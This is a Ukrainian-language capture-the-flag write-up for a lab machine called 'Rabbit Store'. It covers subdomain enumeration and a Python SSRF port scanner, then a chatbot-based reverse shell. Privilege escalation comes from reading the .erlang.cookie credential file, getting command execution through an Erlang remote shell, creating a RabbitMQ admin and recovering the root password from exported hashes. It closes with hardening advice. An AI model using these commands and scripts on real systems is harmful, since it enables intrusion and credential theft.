
# Rabbit Store - Demonstrate your web application testing skills and the basics of Linux to escalate your privileges.

Складність: Medium

Ціль: 10.113.165.77

## 1. Розвідка (Reconnaissance & Enumeration)

### 1.1. Сканування портів (Nmap)
   Починаємо зі стандартного сканування всіх портів для пошуку точок входу:
```bash
└─$ sudo nmap -sC -sV -p- -vv -oN nmap_result.txt 10.113.165.77
```

![nmap](./img/nmap.png)

   Додаємо виявлений домен до файлу `/etc/hosts`:
```bash
└─$ sudo nano /etc/hosts
10.113.165.77   cloudsite.thm
```

### 1.2. Веб-розвідка та Subdomain Enumeration
   Проводимо фаззинг директорій та шукаємо віртуальні хости (subdomains):
```bash
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt   -u http://cloudsite.thm -k -t 50 -x html,php,txt
```

![gobuster](./img/gobuster.png)

   Шукаємо піддомени за допомогою `ffuf`:
```bash
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cloudsite.thm/ -H "Host:FUZZ.cloudsite.thm" -fw 18
```

![ffuf](./img/ffuf.png)

   Оновлюємо `/etc/hosts`, додаючи новий піддомен `storage.cloudsite.thm`:
```bash
└─$ sudo nano /etc/hosts
10.113.165.77   cloudsite.thm   storage.cloudsite.thm
```

## 2. Аналіз функціоналу та API Enumeration 
   Досліджуємо функціонал реєстрації та роботу з файлами/API на новому піддомені:
   
![storage_cloudsite_thm](./img/storage_cloudsite_thm.png)

![burp_register_1](./img/burp_register_1.png)
![sub_error](./img/sub_error.png)

![burp_register_2](./img/burp_register_2.png)

   Шукаємо приховані ендпоїнти в API за допомогою `gobuster`:
```bash
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt   -u http://storage.cloudsite.thm/api/ -k -t 50 
```

![gobuster_api](./img/gobuster_api.png)

   Тестуємо функціонал завантаження файлів та роботу сервісу:
   
![upload](./img/upload.png)
![upload_2](./img/upload_2.png)
![upload_test](./img/upload_test.png)
![nc_upload_test.png](./img/nc_upload_test.png)
![burp_upload_test](./img/burp_upload_test.png)

## 3. Вразливість SSRF та Внутрішнє Сканування
   Додаток містить ендпоїнт `/api/store-url`, який дозволяє викликати SSRF. Для пошуку закритих внутрішніх сервісів пишемо кастомний багатопотоковий сканер на Python:
   
```python
import requests
import sys
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm

# URL ендпоінту для SSRF
url = "http://storage.cloudsite.thm/api/store-url"

# ВСТАВ СЮДИ СВІЙ JWT ТОКЕН З BURP
cookies = {
    "jwt": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImhhY2tlckB0ZXN0LnRobSIsInN1YnNjcmlwdGlvbiI6ImFjdGl2ZSIsImlhdCI6MTc4NDYzMTQ2OSwiZXhwIjoxNzg0NjM1MDY5fQ.HoqxRs08ChPPHbrY9NZtMCI7kIpyx2CpiM2Z2tJfoPw"
}

open_ports = []

def check_port(port):
    data = {"url": f"http://127.0.0.1:{port}/"}
    try:
        response = requests.post(url, json=data, cookies=cookies, timeout=3)
        # Якщо сервер відповідає 200 OK — порт відкритий
        if response.status_code == 200:
            open_ports.append(port)
            # tqdm.write дозволяє друкувати знайдені порти, не ламаючи прогрес-бар
            tqdm.write(f"[+] Знайдено відкритий порт: {port}")
    except Exception:
        pass

def main():
    ports_to_scan = range(1, 65536)
    print("[*] Починаємо сканування внутрішніх портів (1-65535)...")
    
    # max_workers=20 пришвидшить сканування
    with ThreadPoolExecutor(max_workers=20) as executor:
        # tqdm обгортає executor.map для відображення шкали
        list(tqdm(executor.map(check_port, ports_to_scan), total=len(ports_to_scan), desc="Сканування", unit="port"))

    print("\n[✔] Сканування завершено!")
    print(f"Відкриті порти: {sorted(open_ports)}")

if __name__ == "__main__":
    main()
```

![port_scanner_result](./img/port_scanner_result.png)

## 4. Отримання початкового доступу (Initial Access)
   Вивчаємо внутрішню документацію API та функціонал чат-бота, знайдений через внутрішній сервіс:

![burp_api_docs](./img/burp_api_docs.png)
![burp_api_docs_2](./img/burp_api_docs_2.png)

![burp_api_chatbot](./img/burp_api_chatbot.png)
![burp_api_chatbot_test_1.png](./img/burp_api_chatbot_test_1.png)
![burp_api_chatbot_test_2.png](./img/burp_api_chatbot_test_2.png)

   Готуємо слухач Netcat:
```bash
└─$ nc -nlvp 4444
```

Експлуатуємо вразливість через чат-бот для отримання реверс-шеллу (`user.txt`):

![burp_api_chatbot_revshell](./img/burp_api_chatbot_revshell.png)

![user_txt](./img/user_txt.png)

## 5. Підвищення привілеїв (Privilege Escalation)
   Після попадання на систему під користувачем `azrael`, досліджуємо запущені сервіси та знаємо, що на машині працює Erlang/RabbitMQ.
   Перевіряємо запущені ноди Erlang:
```bash
azrael@forge:~$ epmd -names
epmd: up and running on port 4369 with data:
name rabbit at port 25672
```
   
   Знаходимо секретний файл Cookie для Ерланга:
```bash
azrael@forge:~$ cat /var/lib/rabbitmq/.erlang.cookie
z6wMPLwz0VW0mSCXazrael@forge:~$ 
```

   Cookie: z6wMPLwz0VW0mSCX

### Підключення до Erlang Node та RCE
   Підключаємося до віддаленої ноди через `eshell`:
```bash
   erl -sname attacker -setcookie "z6wMPLwz0VW0mSCX" -remsh rabbit@forge
```

   Виконуємо системні команди через інтерактивну сесію Ерланга:
```Erlang
(rabbit@forge)1> os:cmd("id").
"uid=124(rabbitmq) gid=131(rabbitmq) groups=131(rabbitmq)\n"
```   

### Експорт конфігурації та отримання Root-пароля
   Виправляємо права доступу до кукі та експортуємо конфігурацію RabbitMQ:
```Erlang
(rabbit@forge)2> os:cmd("ls -la /var/lib/rabbitmq/mnesia/rabbit@forge/").
"total 116\ndrwxr-x--- 5 rabbitmq rabbitmq  4096 Jul 21 10:09 .\ndrwxr-x--- 4 rabbitmq rabbitmq  4096 Jul 21 10:06 ..\n-rw-r----- 1 rabbitmq rabbitmq    33 Jul 21 10:06 cluster_nodes.config\ndrwxr-x--- 3 rabbitmq rabbitmq  4096 Aug 15  2024 coordination\n-rw-r----- 1 rabbitmq rabbitmq   155 Jul 21 10:09 DECISION_TAB.LOG\n-rw-r----- 1 rabbitmq rabbitmq    91 Jul 21 10:09 LATEST.LOG\ndrwxr-x--- 3 rabbitmq rabbitmq  4096 Jul 18  2024 msg_stores\n-rw-r----- 1 rabbitmq rabbitmq    16 Jul 21 10:06 nodes_running_at_shutdown\ndrwxr-x--- 3 rabbitmq rabbitmq  4096 Jul 18  2024 quorum\n-rw-r----- 1 rabbitmq rabbitmq  1324 Jul 18  2024 rabbit_durable_exchange.DCD\n-rw-r----- 1 rabbitmq rabbitmq   308 Jul 21 10:06 rabbit_durable_queue.DCD\n-rw-r----- 1 rabbitmq rabbitmq   377 Jul 21 10:09 rabbit_durable_queue.DCL\n-rw-r----- 1 rabbitmq rabbitmq     8 Jul 18  2024 rabbit_durable_route.DCD\n-rw-r----- 1 rabbitmq rabbitmq   254 Aug 15  2024 rabbit_runtime_parameters.DCD\n-rw-r----- 1 rabbitmq rabbitmq     5 Jul 21 10:06 rabbit_serial\n-rw-r----- 1 rabbitmq rabbitmq   220 Jul 18  2024 rabbit_topic_permission.DCD\n-rw-r----- 1 rabbitmq rabbitmq   463 Jul 19  2024 rabbit_user.DCD\n-rw-r----- 1 rabbitmq rabbitmq   184 Jul 18  2024 rabbit_user_permission.DCD\n-rw-r----- 1 rabbitmq rabbitmq   167 Jul 18  2024 rabbit_vhost.DCD\n-rw-r----- 1 rabbitmq rabbitmq 29393 Aug 15  2024 schema.DAT\n-rw-r----- 1 rabbitmq rabbitmq   342 Jul 18  2024 schema_version\n"

(rabbit@forge)4> os:cmd("rabbitmqctl add_user admin password123 && rabbitmqctl set_user_tags admin administrator && rabbitmqctl set_permissions -p / admin \".*\" \".*\" \".*\"").
"\n13:29:24.462 [error] Cookie file ./.erlang.cookie must be accessible by owner only\n\n13:29:25.416 [error] Cookie file ./.erlang.cookie must be accessible by owner only\n\n13:29:25.422 [error] Cookie file ./.erlang.cookie must be accessible by owner only\n\n13:29:26.335 [error] Cookie file ./.erlang.cookie must be accessible by owner only\n\n13:29:26.339 [error] Cookie file ./.erlang.cookie must be accessible by owner only\n\n13:29:27.251 [error] Cookie file ./.erlang.cookie must be accessible by owner only\n\n13:29:27.257 [error] Cookie file ./.erlang.cookie must be accessible by owner only\n\n13:29:28.196 [error] Cookie file ./.erlang.cookie must be accessible by owner only\n\n13:29:28.201 [error] Cookie file ./.erlang.cookie must be accessible by owner only\n\n13:29:29.141 [error] Cookie file ./.erlang.cookie must be accessible by owner only\n\n13:29:29.146 [error] Cookie file ./.erlang.cookie must be accessible by owner only\n\n13:29:30.077 [error] Cookie file ./.erlang.cookie must be accessible by owner only\n\n13:29:30.083 [error] Cookie file ./.erlang.cookie must be accessible by owner only\n\n13:29:31.007 [error] Cookie file ./.erlang.cookie must be accessible by owner only\n\n13:29:31.012 [error] Cookie file ./.erlang.cookie must be accessible by owner only\n\n13:29:31.930 [error] Cookie file ./.erlang.cookie must be accessible by owner only\n\n13:29:31.936 [error] Cookie file ./.erlang.cookie must be accessible by owner only\n\n13:29:32.854 [error] Cookie file ./.erlang.cookie must be accessible by owner only\n\n13:29:32.859 [error] Cookie file ./.erlang.cookie must be accessible by owner only\n\n13:29:33.782 [error] Cookie file ./.erlang.cookie must be accessible by owner only\nDistribution failed: {{:shutdown, {:failed_to_start_child, :auth, {'Cookie file ./.erlang.cookie must be accessible by owner only', [{:auth, :init_no_setcookie, 0, [file: 'auth.erl', line: 293]}, {:auth, :init, 1, [file: 'auth.erl', line: 144]}, {:gen_server, :init_it, 2, [file: 'gen_server.erl', line: 423]}, {:gen_server, :init_it, 6, [file: 'gen_server.erl', line: 390]}, {:proc_lib, :init_p_do_apply, 3, [file: 'proc_lib.erl', line: 226]}]}}}, {:child, :undefined, :net_sup_dynamic, {:erl_distribution, :start_link, [[:\"rabbitmqcli-587-rabbit@forge\", :shortnames, 15000], false, :net_sup_dynamic]}, :permanent, false, 1000, :supervisor, [:erl_distribution]}}\n"

(rabbit@forge)5> os:cmd("chmod 400 /var/lib/rabbitmq/.erlang.cookie && chown rabbitmq:rabbitmq /var/lib/rabbitmq/.erlang.cookie").
[]

(rabbit@forge)6> os:cmd("rabbitmqctl add_user admin password123 && rabbitmqctl set_user_tags admin administrator && rabbitmqctl set_permissions -p / admin \".*\" \".*\" \".*\"").
"Adding user \"admin\" ...\nDone. Don't forget to grant the user permissions to some virtual hosts! See 'rabbitmqctl help set_permissions' to learn more.\nSetting tags for user \"admin\" to [administrator] ...\nSetting permissions for user \"admin\" in vhost \"/\" ...\n"

(rabbit@forge)7> os:cmd("rabbitmqadmin export /tmp/defs.json -u admin -p password123").
"Exported definitions for localhost to \"/tmp/defs.json\"\n"

(rabbit@forge)8> os:cmd("cat /tmp/defs.json").
"{\"rabbit_version\":\"3.9.13\",\"rabbitmq_version\":\"3.9.13\",\"product_name\":\"RabbitMQ\",\"product_version\":\"3.9.13\",\"users\":[{\"name\":\"admin\",\"password_hash\":\"+adXyUvqaG306j4IECex5uQlncBz0hxzFPWJse0qLMW9Q6Si\",\"hashing_algorithm\":\"rabbit_password_hashing_sha256\",\"tags\":[\"administrator\"],\"limits\":{}},{\"name\":\"The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.\",\"password_hash\":\"vyf4qvKLpShONYgEiNc6xT/5rLq+23A2RuuhEZ8N10kyN34K\",\"hashing_algorithm\":\"rabbit_password_hashing_sha256\",\"tags\":[],\"limits\":{}},{\"name\":\"root\",\"password_hash\":\"49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF\",\"hashing_algorithm\":\"rabbit_password_hashing_sha256\",\"tags\":[\"administrator\"],\"limits\":{}}],\"vhosts\":[{\"name\":\"/\"}],\"permissions\":[{\"user\":\"root\",\"vhost\":\"/\",\"configure\":\".*\",\"write\":\".*\",\"read\":\".*\"},{\"user\":\"admin\",\"vhost\":\"/\",\"configure\":\".*\",\"write\":\".*\",\"read\":\".*\"}],\"topic_permissions\":[{\"user\":\"root\",\"vhost\":\"/\",\"exchange\":\"\",\"write\":\".*\",\"read\":\".*\"}],\"parameters\":[],\"global_parameters\":[{\"name\":\"cluster_name\",\"value\":\"rabbit@forge\"},{\"name\":\"internal_cluster_id\",\"value\":\"rabbitmq-cluster-id-JVvInsfJs-N_wll9ptLLoQ\"}],\"policies\":[],\"queues\":[{\"name\":\"tasks\",\"vhost\":\"/\",\"durable\":true,\"auto_delete\":false,\"arguments\":{}}],\"exchanges\":[],\"bindings\":[]}"
(rabbit@forge)9>
```

   У вивантаженому файлі `/tmp/defs.json` знаходимо хеш пароля та спеціальну підказку для системного користувача `root`:
```json
   {
  "name": "The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.",
  "password_hash": "vyf4qvKLpShONYgEiNc6xT/5rLq+23A2RuuhEZ8N10kyN34K",
  "hashing_algorithm": "rabbit_password_hashing_sha256",
  "tags": [],
  "limits": {}
  }
```

   Використовуємо Python-скрипт для парсингу бінарного формату солі та отримання чистих даних:
```python
import base64
import hashlib

# RabbitMQ sha256 password hash from defs.json
h_b64 = "49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF"
decoded = base64.b64decode(h_b64)

salt = decoded[:4]
stored_hash = decoded[4:]

print(f"Salt (hex): {salt.hex()}")
print(f"Hash (hex): {stored_hash.hex()}")
```

   Вивід скрипта:
```bash
azrael@forge:/tmp$ python3 decode.py 
Salt (hex): e3d7ba85
Hash (hex): 295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
azrael@forge:/tmp$  
```

   Перемикаємося на суперкористувача через отриманий SHA-256 рядок:
```bash
azrael@forge:/tmp$ su -
```

   Вводимо отриманий хеш як пароль та забираємо фінальний прапор:
    
![root_txt](./img/root_txt.png)

## Висновки (Conclusion)

Проходження машини продемонструвало класичний ланцюжок атак (Kill Chain), який складається з кількох етапів:
1. **Веб-розвідка та розширення поверхові атаки:** Виявлення прихованих піддоменів (`storage.cloudsite.thm`) дозволило знайти додатковий функціонал, який слугував вектором для початкового проникнення.
2. **Вразливість SSRF (Server-Side Request Forgery):** Наявність небезпечного ендпоінту `/api/store-url` дала можливість написати кастомний багатопотоковий скрипт для сканування внутрішніх портів мережі `127.0.0.1`, що зазвичай прихована від зовнішнього користувача. Це виявило додаткові внутрішні сервіси та документацію API.
3. **Обхід логіки додатку та RCE:** Експлуатація знайденого функціоналу чат-бота через внутрішнє API призвела до виконання довільного коду на сервері та отримання первинного шеллу під користувачем `azrael`.
4. **Помилки конфігурації у службах (Erlang/RabbitMQ):** На етапі підвищення привілеїв ключову роль зіграв неналежний захист файлів внутрішніх комунікацій (розголошення `.erlang.cookie`). Доступ до ноди RabbitMQ дозволив виконати код від імені сервісного юзера `rabbitmq`, створити адміністратора та вивантажити внутрішні конфігураційні дефініції.
5. **Деструктивний аналіз та ланцюгове підвищення прав:** Використання внутрішньої логіки зберігання облікових даних (де пароль системного `root` виявився пов'язаним із хешем сервісу RabbitMQ) дозволило повністю захопити контроль над операційною системою без необхідності брутфорсу складних хешів.

### Головні рекомендації для захисту подібних систем:
  * Завжди обмежувати доступ до локальних портів та перевіряти вхідні URL-адреси утилітами SSRF-фільтрації (заборонити запити на loopback `127.0.0.1`/`localhost`).
  * Суворо контролювати права доступу до системних файлів на кшталт `.erlang.cookie` (права мають бути виключно `400` для власника).
  * Уникати використання похідних хешів службових облікових записів як паролів для системних адміністративних акаунтів (`root`).
